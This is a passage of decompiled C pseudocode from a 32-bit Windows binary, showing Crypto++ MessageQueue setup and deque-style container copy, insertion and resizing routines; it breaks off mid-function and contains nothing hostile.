  sub_41D6C1(&v20, &a5);
  if ( v20 )
    v11 = *v20;
  else
    v11 = 0;
  v14 = a7;
  v20 = 0;
  v13 = v11;
  v21 = 0;
  sub_41D6C1(&v20, &a2);
  if ( v20 )
    v10 = *v20;
  sub_426D1B(a1, v10, a4, v13, v14, v15, v16, v17);
  return a1;
}

//----- (00426E94) --------------------------------------------------------
_DWORD *__cdecl sub_426E94(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, int a6, unsigned int a7)
{
  unsigned int v7; // ebx
  unsigned int i; // edi
  _DWORD *result; // eax

  v7 = a3;
  for ( i = a7; v7 != a5; a3 = v7 )
  {
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a6 + 4) + 4 * ((i >> 2) & (*(_DWORD *)(a6 + 8) - 1))) + 4 * (i & 3)) = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * ((v7 >> 2) & (*(_DWORD *)(a2 + 8) - 1))) + 4 * (v7 & 3));
    i = a7 + 1;
    v7 = a3 + 1;
    ++a7;
  }
  result = a1;
  a1[1] = i;
  *a1 = a6;
  return result;
}

//----- (00426EFC) --------------------------------------------------------
_DWORD *__cdecl sub_426EFC(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, int a6, unsigned int a7)
{
  unsigned int v7; // ebx
  unsigned int i; // ebp
  unsigned int v9; // eax
  int v10; // ebp
  int v11; // edi
  unsigned int v12; // eax
  int v13; // ebx
  int v14; // edx
  int v15; // ecx
  _DWORD *result; // eax

  v7 = a7;
  for ( i = a3; i != a5; a3 = i )
  {
    v9 = i >> 1;
    v10 = i & 1;
    v11 = v9 & (*(_DWORD *)(a2 + 8) - 1);
    v12 = v7;
    v13 = v7 & 1;
    v14 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * v11);
    v15 = *(_DWORD *)(*(_DWORD *)(a6 + 4) + 4 * ((v12 >> 1) & (*(_DWORD *)(a6 + 8) - 1)));
    *(_DWORD *)(v15 + 8 * v13) = *(_DWORD *)(v14 + 8 * v10);
    *(_DWORD *)(v15 + 8 * v13 + 4) = *(_DWORD *)(v14 + 8 * v10 + 4);
    v7 = a7 + 1;
    i = a3 + 1;
    ++a7;
  }
  result = a1;
  a1[1] = v7;
  *a1 = a6;
  return result;
}

//----- (00426F74) --------------------------------------------------------
_DWORD *__cdecl sub_426F74(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, int a6, unsigned int a7)
{
  sub_426E94(a1, a2, a3, a4, a5, a6, a7);
  return a1;
}

//----- (00426FA3) --------------------------------------------------------
_DWORD *__cdecl sub_426FA3(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, int a6, unsigned int a7)
{
  sub_426EFC(a1, a2, a3, a4, a5, a6, a7);
  return a1;
}

//----- (00426FD2) --------------------------------------------------------
int __cdecl sub_426FD2(_DWORD **a1, int a2, unsigned int a3, _DWORD **a4, int a5, int a6, int *a7)
{
  int v7; // esi
  int v8; // eax
  int v10; // [esp-Ch] [ebp-1Ch]
  int v11; // [esp-8h] [ebp-18h]
  int *v12; // [esp-4h] [ebp-14h]
  int *v13; // [esp+4h] [ebp-Ch] BYREF
  int v14; // [esp+8h] [ebp-8h]

  v12 = a7;
  v7 = 0;
  v13 = 0;
  v14 = 0;
  sub_41D6C1(&v13, &a4);
  if ( v13 )
    v8 = *v13;
  else
    v8 = 0;
  v11 = a6;
  v13 = 0;
  v10 = v8;
  v14 = 0;
  sub_41D6C1(&v13, &a1);
  if ( v13 )
    v7 = *v13;
  return sub_426A5A(v7, a3, v10, v11, v12);
}

//----- (0042702D) --------------------------------------------------------
int __cdecl sub_42702D(_DWORD **a1, int a2, unsigned int a3, _DWORD **a4, int a5, int a6, _DWORD *a7)
{
  int v7; // esi
  int v8; // eax
  int v10; // [esp-Ch] [ebp-1Ch]
  int v11; // [esp-8h] [ebp-18h]
  _DWORD *v12; // [esp-4h] [ebp-14h]
  int *v13; // [esp+4h] [ebp-Ch] BYREF
  int v14; // [esp+8h] [ebp-8h]

  v12 = a7;
  v7 = 0;
  v13 = 0;
  v14 = 0;
  sub_41D6C1(&v13, &a4);
  if ( v13 )
    v8 = *v13;
  else
    v8 = 0;
  v11 = a6;
  v13 = 0;
  v10 = v8;
  v14 = 0;
  sub_41D6C1(&v13, &a1);
  if ( v13 )
    v7 = *v13;
  return sub_426A80(v7, a3, v10, v11, v12);
}

//----- (00427088) --------------------------------------------------------
_DWORD *__cdecl sub_427088(
        _DWORD *a1,
        _DWORD **a2,
        int a3,
        unsigned int a4,
        _DWORD **a5,
        int a6,
        int a7,
        _DWORD **a8,
        int a9,
        unsigned int a10)
{
  _DWORD **v11; // [esp-18h] [ebp-30h] BYREF
  int v12; // [esp-14h] [ebp-2Ch]
  _DWORD **v13; // [esp-Ch] [ebp-24h] BYREF
  int v14; // [esp-8h] [ebp-20h]
  int v15; // [esp-4h] [ebp-1Ch]
  _DWORD **v16; // [esp+0h] [ebp-18h] BYREF
  int v17; // [esp+4h] [ebp-14h]
  unsigned int v18; // [esp+8h] [ebp-10h]

  v16 = 0;
  v17 = 0;
  sub_41D6C1(&v16, &a8);
  v18 = a10;
  v13 = 0;
  v14 = 0;
  sub_41D6C1(&v13, &a5);
  v15 = a7;
  v11 = 0;
  v12 = 0;
  sub_41D6C1(&v11, &a2);
  sub_426D86(a1, v11, v12, a4, v13, v14, v15, v16, v17, v18);
  return a1;
}

//----- (004270F5) --------------------------------------------------------
_DWORD *__cdecl sub_4270F5(
        _DWORD *a1,
        _DWORD **a2,
        int a3,
        unsigned int a4,
        _DWORD **a5,
        int a6,
        int a7,
        _DWORD **a8,
        int a9,
        unsigned int a10)
{
  _DWORD **v11; // [esp-18h] [ebp-30h] BYREF
  int v12; // [esp-14h] [ebp-2Ch]
  _DWORD **v13; // [esp-Ch] [ebp-24h] BYREF
  int v14; // [esp-8h] [ebp-20h]
  int v15; // [esp-4h] [ebp-1Ch]
  _DWORD **v16; // [esp+0h] [ebp-18h] BYREF
  int v17; // [esp+4h] [ebp-14h]
  unsigned int v18; // [esp+8h] [ebp-10h]

  v16 = 0;
  v17 = 0;
  sub_41D6C1(&v16, &a8);
  v18 = a10;
  v13 = 0;
  v14 = 0;
  sub_41D6C1(&v13, &a5);
  v15 = a7;
  v11 = 0;
  v12 = 0;
  sub_41D6C1(&v11, &a2);
  sub_426E0D(a1, v11, v12, a4, v13, v14, v15, v16, v17, v18);
  return a1;
}

//----- (00427162) --------------------------------------------------------
_DWORD *__cdecl sub_427162(
        _DWORD *a1,
        _DWORD **a2,
        int a3,
        int a4,
        _DWORD **a5,
        int a6,
        int a7,
        _DWORD **a8,
        int a9,
        unsigned int a10)
{
  int v10; // ebx
  int v11; // eax
  int v13; // [esp-1Ch] [ebp-38h]
  int v14; // [esp-18h] [ebp-34h]
  _DWORD **v15; // [esp-14h] [ebp-30h] BYREF
  int v16; // [esp-10h] [ebp-2Ch]
  unsigned int v17; // [esp-Ch] [ebp-28h]
  int v18; // [esp-8h] [ebp-24h]
  int v19; // [esp-4h] [ebp-20h]
  int *v20; // [esp+8h] [ebp-14h] BYREF
  int v21; // [esp+Ch] [ebp-10h]
  int v22; // [esp+14h] [ebp-8h]
  int v23; // [esp+18h] [ebp-4h]

  v10 = 0;
  LOBYTE(v23) = 0;
  v19 = v23;
  LOBYTE(v22) = 0;
  v18 = v22;
  v15 = 0;
  v16 = 0;
  sub_41D6C1(&v15, &a8);
  v17 = a10;
  v20 = 0;
  v21 = 0;
  sub_41D6C1(&v20, &a5);
  if ( v20 )
    v11 = *v20;
  else
    v11 = 0;
  v14 = a7;
  v20 = 0;
  v13 = v11;
  v21 = 0;
  sub_41D6C1(&v20, &a2);
  if ( v20 )
    v10 = *v20;
  sub_426AA6(a1, v10, a4, v13, v14, v15, v16, v17);
  return a1;
}

//----- (004271E9) --------------------------------------------------------
_DWORD *__cdecl sub_4271E9(
        _DWORD *a1,
        _DWORD **a2,
        int a3,
        int a4,
        _DWORD **a5,
        int a6,
        unsigned int a7,
        _DWORD **a8,
        int a9,
        unsigned int a10)
{
  int v10; // ebx
  int v11; // eax
  int v13; // [esp-1Ch] [ebp-38h]
  unsigned int v14; // [esp-18h] [ebp-34h]
  _DWORD **v15; // [esp-14h] [ebp-30h] BYREF
  int v16; // [esp-10h] [ebp-2Ch]
  unsigned int v17; // [esp-Ch] [ebp-28h]
  int v18; // [esp-8h] [ebp-24h]
  int v19; // [esp-4h] [ebp-20h]
  int *v20; // [esp+8h] [ebp-14h] BYREF
  int v21; // [esp+Ch] [ebp-10h]
  int v22; // [esp+14h] [ebp-8h]
  int v23; // [esp+18h] [ebp-4h]

  v10 = 0;
  LOBYTE(v23) = 0;
  v19 = v23;
  LOBYTE(v22) = 0;
  v18 = v22;
  v15 = 0;
  v16 = 0;
  sub_41D6C1(&v15, &a8);
  v17 = a10;
  v20 = 0;
  v21 = 0;
  sub_41D6C1(&v20, &a5);
  if ( v20 )
    v11 = *v20;
  else
    v11 = 0;
  v14 = a7;
  v20 = 0;
  v13 = v11;
  v21 = 0;
  sub_41D6C1(&v20, &a2);
  if ( v20 )
    v10 = *v20;
  sub_426B11(a1, v10, a4, v13, v14, v15, v16, v17);
  return a1;
}

//----- (00427270) --------------------------------------------------------
_DWORD *__thiscall sub_427270(_DWORD *this)
{
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
  this[4] = 0;
  unknown_libname_23();
  return this;
}
// 42773E: using guessed type int unknown_libname_23(void);

//----- (0042728C) --------------------------------------------------------
_DWORD *__thiscall sub_42728C(_DWORD *this, int a2)
{
  *this = 0;
  this[1] = 0;
  sub_41D6C1(this, (_DWORD ***)a2);
  this[2] = *(_DWORD *)(a2 + 8);
  return this;
}

//----- (004272AE) --------------------------------------------------------
_DWORD *__thiscall sub_4272AE(_DWORD *this, int a2, _DWORD *a3)
{
  *this = 0;
  this[1] = 0;
  this[2] = a2;
  if ( a3 )
    *this = *a3;
  return this;
}

//----- (004272CD) --------------------------------------------------------
_DWORD *__thiscall sub_4272CD(_DWORD *this, _DWORD *a2)
{
  int v4; // [esp-4h] [ebp-2Ch]
  __int64 v5; // [esp+10h] [ebp-18h] BYREF
  _DWORD *v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = this;
  sub_40CAC3(this, 0);
  v4 = (int)a2;
  this[3] = -1;
  *this = &CryptoPP::MessageQueue::`vftable';
  this[1] = &CryptoPP::MessageQueue::`vftable';
  sub_424BAD(this + 4, v4);
  v7 = 1;
  a2 = this + 14;
  v5 = 0i64;
  sub_427270(this + 14);
  sub_4277A4(this + 14, 1, &v5);
  a2 = 0;
  LOBYTE(v7) = 2;
  HIDWORD(v5) = this + 19;
  sub_427270(this + 19);
  LOBYTE(v7) = 3;
  sub_427762(this + 19, 1, (int *)&a2);
  return this;
}
// 46E5FC: using guessed type void *CryptoPP::MessageQueue::`vftable';
// 46E6B0: using guessed type void *CryptoPP::MessageQueue::`vftable';

//----- (00427371) --------------------------------------------------------
void __thiscall sub_427371(void **this)
{
  sub_428178((int)this);
  std::_Deallocate(*this, 1u, 8u);
  *this = 0;
}

//----- (0042738C) --------------------------------------------------------
void __thiscall sub_42738C(void **this)
{
  sub_4281CF((int)this);
  std::_Deallocate(*this, 1u, 8u);
  *this = 0;
}

//----- (004273A7) --------------------------------------------------------
void __thiscall sub_4273A7(int this)
{
  sub_427371((void **)(this + 76));
  sub_42738C((void **)(this + 56));
  sub_424C9A((_DWORD *)(this + 16));
}

//----- (004273C3) --------------------------------------------------------
int __thiscall sub_4273C3(_DWORD *this, int a2)
{
  _DWORD *v2; // eax
  int **v3; // eax
  int v5[3]; // [esp+0h] [ebp-18h] BYREF
  int v6[3]; // [esp+Ch] [ebp-Ch] BYREF

  v2 = sub_428344(this, v5);
  v3 = (int **)sub_427484((int)v2, v6, a2);
  return sub_4273ED(v3);
}
// 4273C3: using guessed type int var_C[3];
// 4273C3: using guessed type int var_18[3];

//----- (004273ED) --------------------------------------------------------
int __thiscall sub_4273ED(int **this)
{
  int v1; // esi

  if ( *this )
    v1 = **this;
  else
    v1 = 0;
  return *(_DWORD *)(*(_DWORD *)(v1 + 4) + 4 * ((*(_DWORD *)(v1 + 8) - 1) & ((unsigned int)this[2] >> 2)))
       + 4 * ((unsigned int)this[2] & 3);
}

//----- (00427416) --------------------------------------------------------
int __thiscall sub_427416(int **this)
{
  int v1; // esi

  if ( *this )
    v1 = **this;
  else
    v1 = 0;
  return *(_DWORD *)(*(_DWORD *)(v1 + 4) + 4 * ((*(_DWORD *)(v1 + 8) - 1) & ((unsigned int)this[2] >> 1)))
       + 8 * ((unsigned int)this[2] & 1);
}

//----- (0042743E) --------------------------------------------------------
_DWORD *__thiscall sub_42743E(int this, _DWORD *a2, int a3)
{
  int v4; // edi
  _DWORD **v6[2]; // [esp+Ch] [ebp-Ch] BYREF
  int v7; // [esp+14h] [ebp-4h]

  v6[0] = 0;
  v6[1] = 0;
  sub_41D6C1(v6, (_DWORD ***)this);
  v7 = *(_DWORD *)(this + 8) - a3;
  v4 = v7;
  *a2 = 0;
  a2[1] = 0;
  sub_41D6C1(a2, v6);
  a2[2] = v4;
  return a2;
}

//----- (00427484) --------------------------------------------------------
_DWORD *__thiscall sub_427484(int this, _DWORD *a2, int a3)
{
  int v4; // edi
  _DWORD **v6[2]; // [esp+Ch] [ebp-Ch] BYREF
  int v7; // [esp+14h] [ebp-4h]

  v6[0] = 0;
  v6[1] = 0;
  sub_41D6C1(v6, (_DWORD ***)this);
  v7 = a3 + *(_DWORD *)(this + 8);
  v4 = v7;
  *a2 = 0;
  a2[1] = 0;
  sub_41D6C1(a2, v6);
  a2[2] = v4;
  return a2;
}

//----- (004274CA) --------------------------------------------------------
char *__thiscall sub_4274CA(char *this, char a2)
{
  char *v2; // esi

  v2 = this - 4;
  sub_4273A7((int)(this - 4));
  if ( (a2 & 1) != 0 )
    sub_42CF7C(v2);
  return v2;
}

//----- (004274F1) --------------------------------------------------------
int __thiscall sub_4274F1(_DWORD *this)
{
  int **v1; // eax
  _DWORD *v2; // ecx
  int result; // eax
  int v4[3]; // [esp+0h] [ebp-Ch] BYREF

  v1 = (int **)sub_428344(this + 14, v4);
  v2 = (_DWORD *)sub_427416(v1);
  result = 0;
  if ( v2[1] || *v2 )
    return 1;
  return result;
}
// 4274F1: using guessed type int var_C[3];

//----- (0042751B) --------------------------------------------------------
int __thiscall sub_42751B(_DWORD *this, int a2, unsigned __int64 *a3, __int64 a4, int a5, int a6)
{
  unsigned __int64 v7; // rax
  __int64 v9; // rax
  int v10; // edi
  _DWORD *v11; // eax
  int v12; // [esp-Ch] [ebp-1Ch]
  int v13; // [esp-8h] [ebp-18h]
  __int64 v14; // [esp+8h] [ebp-8h] BYREF

  LODWORD(v7) = (*(int (__thiscall **)(_DWORD *))(*this + 60))(this);
  if ( *a3 >= v7 )
    return 0;
  v9 = ((__int64 (__thiscall *)(_DWORD *))*(_DWORD *)(*this + 60))(this);
  v13 = a6;
  v10 = this[4];
  v12 = a5;
  v14 = v9;
  v11 = sub_40AA7B(&v14, &a4);
  return (*(int (__thiscall **)(_DWORD *, int, unsigned __int64 *, _DWORD, _DWORD, int, int))(v10 + 128))(
           this + 4,
           a2,
           a3,
           *v11,
           v11[1],
           v12,
           v13);
}
// 427535: variable 'v7' is possibly undefined

//----- (0042757C) --------------------------------------------------------
char __thiscall sub_42757C(_DWORD *this)
{
  bool v2; // zf

  if ( !(*(int (__thiscall **)(_DWORD *))(*this + 92))(this)
    || (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 64))(this) )
  {
    return 0;
  }
  v2 = this[18]-- == 1;
  if ( v2 )
    this[17] = 0;
  else
    ++this[17];
  if ( !*(_DWORD *)sub_4273C3(this + 19, 0) && this[23] > 1u )
  {
    v2 = this[23]-- == 1;
    if ( v2 )
      this[22] = 0;
    else
      ++this[22];
  }
  return 1;
}

//----- (004275D1) --------------------------------------------------------
int __thiscall sub_4275D1(_DWORD *this, int a2)
{
  __int64 v4; // [esp+4h] [ebp-8h] BYREF

  (*(void (__thiscall **)(_DWORD *, int))(this[4] + 28))(this + 4, a2);
  v4 = 0i64;
  sub_42828E(this + 14, 1u, (int *)&v4);
  a2 = 0;
  return sub_428226(this + 19, 1u, &a2);
}

//----- (00427613) --------------------------------------------------------
char __thiscall sub_427613(_DWORD *this, int a2)
{
  int v3; // [esp+0h] [ebp-4h] BYREF

  v3 = 0;
  sub_428674(this + 19, &v3);
  return 0;
}

//----- (0042762F) --------------------------------------------------------
__int64 __thiscall sub_42762F(_DWORD *this)
{
  int **v1; // eax
  int v3[3]; // [esp+0h] [ebp-Ch] BYREF

  v1 = (int **)sub_428344(this + 14, v3);
  return *(_QWORD *)sub_427416(v1);
}
// 42762F: using guessed type int var_C[3];

//----- (00427650) --------------------------------------------------------
int __thiscall sub_427650(_DWORD *this)
{
  return this[23] - 1;
}

//----- (00427655) --------------------------------------------------------
int __thiscall sub_427655(_DWORD *this)
{
  return this[18] - 1;
}

//----- (0042765A) --------------------------------------------------------
int __thiscall sub_42765A(_DWORD *this)
{
  return *(_DWORD *)sub_4273C3(this + 19, 0);
}

//----- (00427667) --------------------------------------------------------
int __thiscall sub_427667(_DWORD *this, int a2, unsigned int a3, int a4, int a5)
{
  _QWORD *v6; // eax
  _DWORD *v7; // eax
  __int64 v9; // [esp+Ch] [ebp-8h] BYREF

  (*(void (__thiscall **)(_DWORD *, int, unsigned int, _DWORD, int))(this[4] + 20))(this + 4, a2, a3, 0, 1);
  v6 = (_QWORD *)std::wstring::back(this + 14);
  *v6 += a3;
  if ( a4 )
  {
    v9 = 0i64;
    sub_4286F5(this + 14, &v9);
    v7 = (_DWORD *)std::wstring::back(this + 19);
    ++*v7;
  }
  return 0;
}
// 4282F6: using guessed type int __thiscall std::wstring::back(_DWORD);
// 42831D: using guessed type int __thiscall std::wstring::back(_DWORD);

//----- (004276C1) --------------------------------------------------------
int __thiscall sub_4276C1(_DWORD *this, int a2)
{
  int result; // eax

  result = a2;
  this[3] = a2;
  return result;
}

//----- (004276CB) --------------------------------------------------------
int __thiscall sub_4276CB(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[4] + 60))(this + 4);
}

//----- (004276D3) --------------------------------------------------------
int __thiscall sub_4276D3(_DWORD *this, int a2, int a3, int a4, int a5)
{
  _DWORD *v6; // eax
  int v7; // esi
  int **v8; // eax
  _DWORD *v9; // eax
  bool v10; // cf
  int v12; // [esp+Ch] [ebp-Ch] BYREF
  __int64 v13; // [esp+10h] [ebp-8h] BYREF

  v13 = ((__int64 (__thiscall *)(_DWORD *))*(_DWORD *)(*this + 60))(this);
  v6 = sub_40AA7B(&v13, (_QWORD *)a3);
  *(_DWORD *)a3 = *v6;
  *(_DWORD *)(a3 + 4) = v6[1];
  v7 = (*(int (__thiscall **)(_DWORD *, int, int, int, int))(this[4] + 124))(this + 4, a2, a3, a4, a5);
  v8 = (int **)sub_428344(this + 14, &v12);
  v9 = (_DWORD *)sub_427416(v8);
  v10 = *v9 < *(_DWORD *)a3;
  *v9 -= *(_DWORD *)a3;
  v9[1] -= v10 + *(_DWORD *)(a3 + 4);
  return v7;
}

//----- (00427762) --------------------------------------------------------
int __thiscall sub_427762(_DWORD *this, int a2, int *a3)
{
  int result; // eax

  while ( a2 )
  {
    result = sub_428674(this, a3);
    --a2;
  }
  return result;
}

//----- (004277A4) --------------------------------------------------------
int __thiscall sub_4277A4(_DWORD *this, int a2, _DWORD *a3)
{
  int result; // eax

  while ( a2 )
  {
    result = sub_4286F5(this, a3);
    --a2;
  }
  return result;
}

//----- (004277E6) --------------------------------------------------------
void __thiscall sub_4277E6(int this, unsigned int a2)
{
  unsigned int v3; // edi
  unsigned int v4; // ecx
  unsigned int v5; // edi
  _DWORD *v6; // ebp
  void *v7; // edx
  void *v8; // eax
  void *v9; // eax
  unsigned int v10; // [esp+10h] [ebp+4h]

  v3 = 1;
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    v3 = v4;
  while ( v3 - v4 < a2 || v3 < 8 )
  {
    if ( 0xFFFFFFF - v3 < v3 )
      sub_429710("deque<T> too long");
    v3 *= 2;
  }
  v5 = v3 - v4;
  v10 = *(_DWORD *)(this + 12) >> 2;
  v6 = sub_40B7DF(v4 + v5, 4u, 1);
  v7 = (void *)sub_40AAC1(
                 (void *)(4 * v10 + *(_DWORD *)(this + 4)),
                 *(_DWORD *)(this + 4) + 4 * *(_DWORD *)(this + 8),
                 &v6[v10]);
  if ( v10 > v5 )
  {
    sub_40AAC1(*(void **)(this + 4), 4 * v5 + *(_DWORD *)(this + 4), v7);
    v9 = (void *)sub_40AAC1((void *)(4 * v5 + *(_DWORD *)(this + 4)), *(_DWORD *)(this + 4) + 4 * v10, v6);
    memset(v9, 0, 4 * v5);
  }
  else
  {
    v8 = (void *)sub_40AAC1(*(void **)(this + 4), *(_DWORD *)(this + 4) + 4 * v10, v7);
    memset(v8, 0, 4 * (v5 - v10));
    memset(v6, 0, 4 * v10);
  }
  if ( *(_DWORD *)(this + 4) )
    std::_Deallocate(*(void **)(this + 4), *(_DWORD *)(this + 8), 4u);
  *(_DWORD *)(this + 4) = v6;
  *(_DWORD *)(this + 8) += v5;
}

//----- (0042790A) --------------------------------------------------------
void __thiscall sub_42790A(int this, unsigned int a2)
{
  unsigned int v3; // edi
  unsigned int v4; // ecx
  unsigned int v5; // edi
  _DWORD *v6; // ebp
  void *v7; // edx
  void *v8; // eax
  void *v9; // eax
  unsigned int v10; // [esp+10h] [ebp+4h]

  v3 = 1;
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    v3 = v4;
  while ( v3 - v4 < a2 || v3 < 8 )
  {
    if ( 0xFFFFFFF - v3 < v3 )
      sub_429710("deque<T> too long");
    v3 *= 2;
  }
  v5 = v3 - v4;
  v10 = *(_DWORD *)(this + 12) >> 1;
  v6 = sub_40B7DF(v4 + v5, 4u, 1);
  v7 = (void *)sub_40AAC1(
                 (void *)(4 * v10 + *(_DWORD *)(this + 4)),
                 *(_DWORD *)(this + 4) + 4 * *(_DWORD *)(this + 8),
                 &v6[v10]);
  if ( v10 > v5 )
  {
    sub_40AAC1(*(void **)(this + 4), 4 * v5 + *(_DWORD *)(this + 4), v7);
    v9 = (void *)sub_40AAC1((void *)(4 * v5 + *(_DWORD *)(this + 4)), *(_DWORD *)(this + 4) + 4 * v10, v6);
    memset(v9, 0, 4 * v5);
  }
  else
  {
    v8 = (void *)sub_40AAC1(*(void **)(this + 4), *(_DWORD *)(this + 4) + 4 * v10, v7);
    memset(v8, 0, 4 * (v5 - v10));
    memset(v6, 0, 4 * v10);
  }
  if ( *(_DWORD *)(this + 4) )
    std::_Deallocate(*(void **)(this + 4), *(_DWORD *)(this + 8), 4u);
  *(_DWORD *)(this + 4) = v6;
  *(_DWORD *)(this + 8) += v5;
}

//----- (00427A2D) --------------------------------------------------------
int __thiscall sub_427A2D(_DWORD *this, int a2, int a3, int a4, unsigned int a5, int *a6)
{
  unsigned int v7; // esi
  unsigned int v8; // ecx
  unsigned int v9; // eax
  int j; // eax
  int k; // eax
  _DWORD *v12; // eax
  int **v13; // eax
  int *v14; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // esi
  int v17; // edi
  _DWORD *v18; // eax
  int **v19; // eax
  int *v20; // eax
  _DWORD *v21; // eax
  _DWORD *v22; // esi
  int *v23; // edi
  int v24; // esi
  _DWORD *v25; // eax
  int i; // eax
  unsigned int v27; // eax
  _DWORD *v28; // eax
  int **v29; // eax
  int *v30; // eax
  _DWORD *v31; // eax
  _DWORD *v32; // esi
  unsigned int v33; // ecx
  _DWORD *v34; // eax
  int **v35; // eax
  int *v36; // eax
  _DWORD *v37; // eax
  _DWORD *v38; // esi
  int v39; // esi
  _DWORD *v40; // eax
  _DWORD *v42; // [esp-24h] [ebp-94h] BYREF
  int v43; // [esp-20h] [ebp-90h]
  _DWORD **v44; // [esp-1Ch] [ebp-8Ch] BYREF
  _DWORD **v45; // [esp-18h] [ebp-88h] BYREF
  int v46; // [esp-14h] [ebp-84h]
  _DWORD **v47; // [esp-10h] [ebp-80h] BYREF
  _DWORD **v48; // [esp-Ch] [ebp-7Ch] BYREF
  int v49; // [esp-8h] [ebp-78h]
  int *v50; // [esp-4h] [ebp-74h]
  int v51[3]; // [esp+10h] [ebp-60h] BYREF
  int v52[3]; // [esp+1Ch] [ebp-54h] BYREF
  _DWORD v53[3]; // [esp+28h] [ebp-48h] BYREF
  _DWORD v54[3]; // [esp+34h] [ebp-3Ch] BYREF
  _DWORD **v55[2]; // [esp+40h] [ebp-30h] BYREF
  int *v56; // [esp+48h] [ebp-28h]
  int v57; // [esp+4Ch] [ebp-24h]
  _DWORD *v58; // [esp+50h] [ebp-20h]
  unsigned int v59; // [esp+54h] [ebp-1Ch]
  unsigned int v60; // [esp+58h] [ebp-18h]
  int v61; // [esp+5Ch] [ebp-14h]
  int v62; // [esp+6Ch] [ebp-4h]
  int v63; // [esp+84h] [ebp+14h]

  v58 = this;
  v55[0] = 0;
  v55[1] = 0;
  v56 = 0;
  v7 = a4 - sub_428344(this, v54)[2];
  v8 = this[4] - v7;
  v57 = this[4];
  v9 = a5;
  v61 = v7;
  v60 = v8;
  if ( v7 >= v8 )
  {
    v62 = 2;
    v61 = a5;
    if ( v8 >= a5 )
    {
      v33 = 0;
      v59 = 0;
      while ( v33 < v9 )
      {
        v34 = sub_428344(this, v53);
        v35 = (int **)sub_427484((int)v34, v54, v7 + v60 + v59 - a5);
        v36 = (int *)sub_4273ED(v35);
        sub_428674(this, v36);
        v9 = v61;
        v33 = ++v59;
      }
      v37 = sub_428344(this, v54);
      v38 = sub_427484((int)v37, v53, v7);
      sub_41D6C1(v55, (_DWORD ***)v38);
      v17 = v38[2];
      v39 = v60;
      v56 = (int *)v17;
      a6 = (int *)*a6;
      sub_427484((int)v55, &v48, v60);
      v40 = sub_427484((int)v55, v52, v39);
      sub_42743E((int)v40, &v45, a5);
      v42 = 0;
      v43 = 0;
      sub_41D6C1(&v42, v55);
      sub_427162(v51, (_DWORD **)v42, v43, v17, v45, v46, (int)v47, v48, v49, (unsigned int)v50);
      v50 = (int *)&a6;
      v46 = a5;
    }
    else
    {
      for ( i = a5 - v8; ; i = v61 - 1 )
      {
        v61 = i;
        if ( !i )
          break;
        sub_428674(this, a6);
      }
      v27 = 0;
      v63 = 0;
      while ( v27 < v60 )
      {
        v28 = sub_428344(this, v53);
        v29 = (int **)sub_427484((int)v28, v54, v7 + v63);
        v30 = (int *)sub_4273ED(v29);
        sub_428674(this, v30);
        v27 = ++v63;
      }
      v31 = sub_428344(this, v54);
      v32 = sub_427484((int)v31, v53, v7);
      sub_41D6C1(v55, (_DWORD ***)v32);
      v50 = a6;
      v17 = v32[2];
      v56 = (int *)v17;
      v46 = v60;
    }
    goto LABEL_25;
  }
  v62 = 0;
  if ( v7 < a5 )
  {
    for ( j = a5 - v7; ; j = v59 - 1 )
    {
      v59 = j;
      if ( !j )
        break;
      sub_42877A((int)this, a6);
    }
    for ( k = v7; ; k = v59 - 1 )
    {
      v59 = k;
      if ( !k )
        break;
      v12 = sub_428344(this, v54);
      v13 = (int **)sub_427484((int)v12, v53, a5 - 1);
      v14 = (int *)sub_4273ED(v13);
      sub_42877A((int)this, v14);
    }
    v15 = sub_428344(this, v54);
    v16 = sub_427484((int)v15, v53, a5);
    sub_41D6C1(v55, (_DWORD ***)v16);
    v50 = a6;
    v17 = v16[2];
    v56 = (int *)v17;
    v46 = v61;
LABEL_25:
    sub_427484((int)v55, &v47, v46);
    v44 = 0;
    v45 = 0;
    sub_41D6C1(&v44, v55);
    v46 = v17;
    return sub_426FD2(v44, (int)v45, v46, v47, (int)v48, v49, v50);
  }
  while ( 1 )
  {
    v59 = v9;
    if ( !v9 )
      break;
    v18 = sub_428344(this, v53);
    v19 = (int **)sub_427484((int)v18, v54, a5 - 1);
    v20 = (int *)sub_4273ED(v19);
    sub_42877A((int)this, v20);
    v9 = v59 - 1;
  }
  v21 = sub_428344(this, v54);
  v22 = sub_427484((int)v21, v53, a5);
  sub_41D6C1(v55, (_DWORD ***)v22);
  v56 = (int *)v22[2];
  v23 = v56;
  a6 = (int *)*a6;
  v48 = 0;
  v49 = 0;
  sub_41D6C1(&v48, v55);
  v50 = v23;
  v24 = v61;
  sub_427484((int)v55, &v45, v61);
  sub_427484((int)v55, &v42, a5);
  sub_427088(v53, (_DWORD **)v42, v43, (unsigned int)v44, v45, v46, (int)v47, v48, v49, (unsigned int)v50);
  v50 = (int *)&a6;
  sub_427484((int)v55, &v47, v24);
  v43 = v24;
  v42 = &v44;
  v25 = sub_428344(v58, v53);
  sub_427484((int)v25, v42, v43);
  return sub_426FD2(v44, (int)v45, v46, v47, (int)v48, v49, v50);
}
// 427A2D: using guessed type _DWORD var_3C[3];
// 427A2D: using guessed type _DWORD var_48[3];
// 427A2D: using guessed type int var_54[3];
// 427A2D: using guessed type int var_60[3];

//----- (00427DC2) --------------------------------------------------------
int __thiscall sub_427DC2(_DWORD *this, int a2, int a3, int a4, unsigned int a5, int *a6)
{
  unsigned int v7; // esi
  unsigned int v8; // ecx
  unsigned int v9; // eax
  int j; // eax
  int k; // eax
  _DWORD *v12; // eax
  int **v13; // eax
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // esi
  int v17; // edi
  _DWORD *v18; // eax
  int **v19; // eax
  _DWORD *v20; // eax
  _DWORD *v21; // eax
  _DWORD *v22; // esi
  int *v23; // edi
  int v24; // esi
  _DWORD *v25; // eax
  int i; // eax
  unsigned int v27; // eax
  _DWORD *v28; // eax
